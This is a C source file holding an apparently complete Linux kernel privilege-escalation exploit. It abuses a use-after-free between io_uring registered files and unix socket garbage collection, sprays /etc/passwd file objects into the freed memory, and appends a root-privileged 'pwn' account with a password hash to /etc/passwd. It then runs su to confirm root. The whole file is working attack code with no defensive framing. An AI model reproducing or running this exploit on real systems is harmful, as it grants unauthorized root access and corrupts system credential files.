#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <liburing.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <err.h>

#include <errno.h>
#include <pthread.h>
#include <assert.h>
#include <crypt.h>
#include <sys/stat.h>

pthread_t tids[5];
pthread_mutex_t lock;
pthread_mutex_t lock_unix_gc;

void *slow_write() {
  printf("[*][T1] Starting slow write ..\n");
  clock_t start, end;
  int fd = open("/tmp/rwA", 1);

  if (fd < 0) {
    perror("error open uaf file");
    exit(-1);
  }

  unsigned long int addr = 0x30000000;
  int offset;
  for (offset = 0; offset < 0x80000 / 20; offset++) {
    void *r = mmap((void *)(addr + offset * 0x1000), 0x1000,
                   PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (r < 0) {
      printf("allocate failed at 0x%x\n", offset);
    }
  }

  assert(offset > 0);

  void *mem = (void *)(addr);
  memcpy(mem, "hhhhh", 5);

  struct iovec iov[20];
  for (int i = 0; i < 20; i++) {
    iov[i].iov_base = mem;
    iov[i].iov_len = offset * 0x1000;
  }

  //start = clock();
  // 2GB max
  printf("[*][T1] Slowing write...\n");
  pthread_mutex_lock(&lock);
  if (writev(fd, iov, 20) < 0) {
    perror("slow write");
  }
  //end = clock();
  //double spent = (double)(end - start) / CLOCKS_PER_SEC;
  // P7/P8/P9
  printf("[P] P7/P8/P9\n");
  printf("[+][T1] slow_write finished\n");
  //close(fd);
  //printf("write done, spent %f s\n", spent);
  pthread_mutex_unlock(&lock);
  return 0;
}

int sendfd(int s, int fd)
{
	struct msghdr msg;
	char buf[4096];
	struct cmsghdr *cmsg;
	int fds[1] = { fd };

	memset(&msg, 0, sizeof(msg));
	memset(buf, 0, sizeof(buf));

	msg.msg_control = buf;
	msg.msg_controllen = sizeof(buf);

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(fds));
	memcpy(CMSG_DATA(cmsg), fds, sizeof(fds));

	msg.msg_controllen = CMSG_SPACE(sizeof(fds));

	sendmsg(s, &msg, 0);
}

int wrap_io_uring_setup(int r, void *p)
{
	return syscall(__NR_io_uring_setup, r, p);
}

int io_uring_enter(unsigned int fd, unsigned int to_submit, unsigned int min_complete, unsigned int flags, sigset_t *sig)
{
	return syscall(__NR_io_uring_enter, fd, to_submit, min_complete, flags, sig);
}

int wrap_io_uring_register(unsigned int fd, unsigned int opcode, void *arg, unsigned int nr_args)
{
	return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}

int prepare_request(int fd, struct io_uring_params *params, struct io_uring *ring, struct iovec* iov)
{
	struct io_uring_sqe *sqe;
	io_uring_queue_mmap(fd, params, ring);
	sqe = io_uring_get_sqe(ring);
	sqe->opcode = IORING_OP_WRITEV;
	sqe->fd = 1;
	//sqe->addr = (long) bogus; // POC
  sqe->addr = iov;
	sqe->len = 1;
	sqe->flags = IOSQE_FIXED_FILE;
}

int main(int argc, char **argv)
{

	struct io_uring ring;
	int fd;
	struct io_uring_params *params;
	int rfd[32];
	int s[2];
	int backup_fd;

  void* chunk;
  unsigned long target_filename;
  int target_fd;

  struct stat st;
  stat("/etc/passwd", &st);
  int original_passwd_size = st.st_size; // Used later to verify that /etc/passwd has changed
  int size;


  for(int i = 0; i < 800; i++)
    open("/tmp/null", O_RDWR | O_CREAT | O_TRUNC, 0644);

  struct iovec iov[12];
	iov[0].iov_base = "pwn:$6$pwn$5m1zBfEzD3xCg.wOtCtlKePwQL3Y5UiVAQBEAIv67Ir9JfZjmjO7XwzMzk0IcRoPjtWg.k2ytbimpKp1s/RB2/:0:0:/root:/root:/bin/sh\n";
	iov[0].iov_len = 122;

	socketpair(AF_UNIX, SOCK_DGRAM, 0, s);

	params = malloc(sizeof(*params));
	memset(params, 0, sizeof(*params));
	params->flags = IORING_SETUP_SQPOLL;
	fd = wrap_io_uring_setup(32, params);

	rfd[0] = s[1];
	// O_APPEND in order to append text and not overwrite everything
	rfd[1] = open("/tmp/rwA", O_RDWR | O_CREAT | O_TRUNC | O_APPEND, 0644);

  // P1
  printf("[P] P1\n");
	wrap_io_uring_register(fd, IORING_REGISTER_FILES, rfd, 2);
	close(rfd[1]);

	sendfd(s[0], fd);

	close(s[0]);
	close(s[1]);

  // P2
  printf("[P] P2\n");
  printf("[*] Creating thread for slow write on /tmp/rwA \n");
	if(pthread_create(&tids[0], NULL, slow_write, NULL))
		perror("pthread_create");

  printf("[*] Sleeping while waiting that slow_write starts .. \n");
  sleep(2);
	prepare_request(fd, params, &ring, &iov);
  // P3/P4: should be immediate
  printf("[P] P3/P4\n");
	io_uring_submit(&ring);

  // io_uring_queue_exit(3) will release all resources acquired and initialized by io_uring_queue_init(3). 
  // It first unmaps the memory shared between the application and the kernel 
  // and then closes the io_uring file descriptor.
	io_uring_queue_exit(&ring);

  // Trigger unix_gc
  printf("[P] P5\n");
  printf("[*] Triggering unix_gc and freeing the registered fd\n");
  close(socket(AF_UNIX, SOCK_DGRAM, 0));
  printf("[*] unix_gc finished !\n");

  printf("[P] P6\n");
  printf("[*] Spraying target files ..\n");
  // Spray /etc/passwd files to re-fill the targeted chunk
  for(int i =0; i < 600; i++){
    open("/etc/passwd", O_RDONLY);
  }

  printf("[*] Wait that slow_write finishes ..\n");
  pthread_mutex_lock(&lock);
  printf("[+] Slow write finished .. closing io_uring fd\n");
  pthread_mutex_unlock(&lock);

  printf("[*] Waits that the io_uring thread continues the writev operation while the process is still alive\n");

  // Loop until /etc/passwd is not changed
  // If the exploit fails, here you have an infinite loop :}
  while(original_passwd_size == st.st_size){
    stat("/etc/passwd", &st);
    size = st.st_size;
    sleep(2);
  }

  // Verify successful exploitation
  printf("[+] Everything done ! \n");
  system("echo 'pwn' | su -c 'id' pwn");
  printf("[+] DONE\n");

	return 0;
}
